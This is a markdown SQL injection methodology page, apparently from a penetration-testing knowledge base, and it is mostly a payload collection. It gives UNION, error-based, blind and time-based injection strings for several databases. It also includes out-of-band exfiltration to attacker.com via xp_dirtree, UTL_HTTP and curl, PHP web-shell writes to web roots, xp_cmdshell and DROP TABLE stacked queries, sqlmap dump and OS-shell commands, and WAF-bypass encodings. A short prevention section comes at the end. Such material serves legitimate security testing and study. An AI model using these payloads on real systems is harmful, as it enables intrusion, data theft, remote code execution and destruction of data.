---
title: SQL Injection
category: methodology
tags:
  - sql-injection
  - sqli
  - web
  - database
  - exploitation
  - owasp
last_updated: 2025-12-27
---

# SQL Injection (SQLi)

## Overview

SQL Injection is a code injection technique that exploits security vulnerabilities in an application's database layer. It occurs when user input is incorrectly filtered or not strongly typed and is used in SQL statements.

## Types of SQL Injection

### 1. In-Band SQL Injection

The attacker uses the same communication channel to launch the attack and gather results.

#### Union-Based SQLi
Leverages the UNION SQL operator to combine results from multiple SELECT statements.

```sql
# Basic UNION injection
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

# Determine number of columns
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

# Extract data
' UNION SELECT username,password FROM users--
' UNION SELECT 1,2,3,table_name FROM information_schema.tables--
```

#### Error-Based SQLi
Forces the database to generate an error, revealing information in error messages.

```sql
# MySQL
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)--

# PostgreSQL
' AND 1=CAST((SELECT version()) AS INT)--
' AND 1=1/(SELECT 0 FROM pg_sleep(5))--

# MSSQL
' AND 1=CONVERT(INT,(SELECT @@version))--
' AND 1=1/@@servername--

# Oracle
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--
```

### 2. Blind SQL Injection

No data is transferred via the web application, and the attacker cannot see the result directly.

#### Boolean-Based Blind SQLi
Uses true/false conditions to infer data one bit at a time.

```sql
# Check if condition is true/false
' AND 1=1--    # True condition
' AND 1=2--    # False condition

# Extract database name character by character
' AND SUBSTRING(database(),1,1)='a'--
' AND SUBSTRING(database(),1,1)='b'--
' AND ASCII(SUBSTRING(database(),1,1))>97--

# Binary search approach
' AND ASCII(SUBSTRING(database(),1,1))>109--  # Is first char > 'm'?
' AND ASCII(SUBSTRING(database(),1,1))>115--  # Is first char > 's'?

# Check table existence
' AND (SELECT COUNT(*) FROM users)>0--
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5--
```

#### Time-Based Blind SQLi
Uses time delays to infer information.

```sql
# MySQL
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
' AND BENCHMARK(10000000,SHA1('test'))--

# PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 'a' END)='a'--

# MSSQL
'; WAITFOR DELAY '0:0:5'--
'; IF (1=1) WAITFOR DELAY '0:0:5'--
' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/(SELECT 0) END)=1--

# Oracle
' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--
' AND (SELECT CASE WHEN (1=1) THEN 'a'||DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 'a' END FROM dual)='a'--

# SQLite
' AND (SELECT CASE WHEN (1=1) THEN LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) ELSE 0 END)--
```

### 3. Out-of-Band SQL Injection

Uses different channels to extract data (DNS, HTTP requests).

```sql
# MySQL (requires FILE privilege)
SELECT LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\share\\file'));
SELECT * INTO OUTFILE '\\\\attacker.com\\share\\output.txt' FROM users;

# MSSQL (xp_dirtree)
EXEC master..xp_dirtree '\\attacker.com\share\'
EXEC master..xp_subdirs '\\attacker.com\share\'

# Oracle
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual;
SELECT HTTPURITYPE('http://attacker.com/'||(SELECT user FROM dual)).getclob() FROM dual;

# PostgreSQL
COPY (SELECT user) TO PROGRAM 'curl http://attacker.com/?data='||(SELECT user);
```

## Detection Techniques

### Manual Testing

```
# String terminators
'
"
`
')
")

# Comment sequences
--
#
/**/
-- -

# Logic tests
' OR '1'='1
' OR '1'='1'--
" OR "1"="1
" OR "1"="1"--
' OR 1=1--
" OR 1=1--
OR 1=1
' OR 'x'='x
' AND 'x'='y

# Arithmetic operations
' AND 1=1--
' AND 1=2--
1' AND '1'='1
1' AND '1'='2
```

### Common Entry Points

- Login forms (username/password fields)
- Search boxes
- URL parameters
- Cookie values
- HTTP headers (User-Agent, Referer, X-Forwarded-For)
- JSON/XML data in POST requests

## SQLMap Usage

### Basic Scanning

```bash
# Basic injection test
sqlmap -u "http://target.com/page?id=1"

# POST request
sqlmap -u "http://target.com/login" --data="username=admin&password=test"

# With cookies
sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=abc123"

# Specify injection point
sqlmap -u "http://target.com/page?id=1*"

# From request file (Burp)
sqlmap -r request.txt
```

### Database Enumeration

```bash
# Get current database
sqlmap -u "http://target.com/page?id=1" --current-db

# Get current user
sqlmap -u "http://target.com/page?id=1" --current-user

# List all databases
sqlmap -u "http://target.com/page?id=1" --dbs

# List tables in database
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# List columns in table
sqlmap -u "http://target.com/page?id=1" -D database_name -T table_name --columns

# Dump table data
sqlmap -u "http://target.com/page?id=1" -D database_name -T table_name --dump

# Dump specific columns
sqlmap -u "http://target.com/page?id=1" -D database_name -T table_name -C "username,password" --dump
```

### Advanced SQLMap Options

```bash
# Specify DBMS
sqlmap -u "http://target.com/page?id=1" --dbms=mysql

# Specify technique
# B: Boolean-based, E: Error-based, U: Union-based
# S: Stacked queries, T: Time-based, Q: Inline queries
sqlmap -u "http://target.com/page?id=1" --technique=BEUST

# Increase level and risk
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3

# Use specific tamper scripts
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between

# OS shell
sqlmap -u "http://target.com/page?id=1" --os-shell

# SQL shell
sqlmap -u "http://target.com/page?id=1" --sql-shell

# File read
sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd"

# File write
sqlmap -u "http://target.com/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# Batch mode (no prompts)
sqlmap -u "http://target.com/page?id=1" --batch

# Threads for faster execution
sqlmap -u "http://target.com/page?id=1" --threads=10
```

## Manual Exploitation Payloads

### Database Fingerprinting

```sql
# MySQL
' UNION SELECT @@version--
' UNION SELECT version()--

# PostgreSQL
' UNION SELECT version()--

# MSSQL
' UNION SELECT @@version--

# Oracle
' UNION SELECT banner FROM v$version WHERE ROWNUM=1--
' UNION SELECT version FROM v$instance--

# SQLite
' UNION SELECT sqlite_version()--
```

### Schema Enumeration

```sql
# MySQL
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--

# PostgreSQL
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--

# MSSQL
' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--
' UNION SELECT name,NULL FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--

# Oracle
' UNION SELECT table_name,NULL FROM all_tables--
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--

# SQLite
' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--
' UNION SELECT sql,NULL FROM sqlite_master WHERE type='table' AND name='users'--
```

### Reading Files

```sql
# MySQL
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--

# PostgreSQL
' UNION SELECT pg_read_file('/etc/passwd'),NULL--
CREATE TABLE temp(content text); COPY temp FROM '/etc/passwd'; SELECT * FROM temp;

# MSSQL
' UNION SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS Contents--
```

### Writing Files

```sql
# MySQL
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO DUMPFILE '/var/www/html/shell.php'--

# PostgreSQL
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';

# MSSQL
EXEC xp_cmdshell 'echo ^<?php system($_GET["cmd"]); ?^> > C:\inetpub\wwwroot\shell.php';
```

## WAF Bypass Techniques

### Whitespace Alternatives

```sql
# Use comments instead of spaces
'/**/UNION/**/SELECT/**/NULL--
'%09UNION%09SELECT%09NULL--    # Tab
'%0AUNION%0ASELECT%0ANULL--    # Newline
'%0DUNION%0DSELECT%0DNULL--    # Carriage return
'+UNION+SELECT+NULL--
'(UNION(SELECT(NULL)))--
```

### Case Manipulation

```sql
'uNiOn SeLeCt NULL--
'UnIoN sElEcT NULL--
```

### URL Encoding

```sql
# Single encoding
%27%20UNION%20SELECT%20NULL--

# Double encoding
%2527%2520UNION%2520SELECT%2520NULL--

# Unicode encoding
%u0027%u0020UNION%u0020SELECT%u0020NULL--
```

### Comment Injection

```sql
'UNION/*comment*/SELECT/*comment*/NULL--
'UN/**/ION SEL/**/ECT NULL--
'/*!50000UNION*//*!50000SELECT*/NULL--  # MySQL version-specific comments
```

### Keyword Alternatives

```sql
# UNION alternatives
' UNION ALL SELECT NULL--

# OR alternatives
' || 1=1--
' && 1=1--

# Comment alternatives
'--+
'--%20
'#
';%00
```

### Encoding Functions

```sql
# Using CHAR()
' UNION SELECT CHAR(65,66,67)--

# Using CONCAT()
' UNION SELECT CONCAT(CHAR(65),CHAR(66),CHAR(67))--

# Hex encoding
' UNION SELECT 0x414243--

# Base64 (if supported)
' UNION SELECT FROM_BASE64('c2VjcmV0')--
```

### SQLMap Tamper Scripts

```bash
# Common tamper scripts
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment
sqlmap -u "http://target.com/page?id=1" --tamper=between
sqlmap -u "http://target.com/page?id=1" --tamper=randomcase
sqlmap -u "http://target.com/page?id=1" --tamper=charencode
sqlmap -u "http://target.com/page?id=1" --tamper=equaltolike

# Combine multiple tampers
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between,randomcase

# List available tamper scripts
sqlmap --list-tampers
```

## Second-Order SQL Injection

Occurs when user input is stored and later used in a different context.

```sql
# Registration payload (stored in database)
Username: admin'--

# Later used in:
SELECT * FROM users WHERE username='admin'--'

# Profile update example
# Stored: O'Brien
# Used: UPDATE users SET name='O'Brien' WHERE id=1  # Causes error
```

## Stacked Queries

```sql
# MySQL (limited support)
'; DROP TABLE users;--
'; INSERT INTO users VALUES('hacker','password');--

# PostgreSQL
'; DROP TABLE users;--
'; CREATE TABLE temp AS SELECT * FROM users;--

# MSSQL (full support)
'; EXEC xp_cmdshell 'whoami';--
'; INSERT INTO users VALUES('hacker','password');--
```

## Prevention

1. **Parameterized Queries (Prepared Statements)**
   - Use placeholders for user input
   - Never concatenate user input into queries

2. **Input Validation**
   - Whitelist allowed characters
   - Validate data type, length, and format

3. **Least Privilege**
   - Use database accounts with minimal permissions
   - Restrict file read/write privileges

4. **Error Handling**
   - Display generic error messages
   - Log detailed errors server-side only

5. **WAF/IDS**
   - Deploy Web Application Firewall
   - Monitor for SQLi patterns

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)
- [SQLMap Documentation](https://sqlmap.org/)
- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
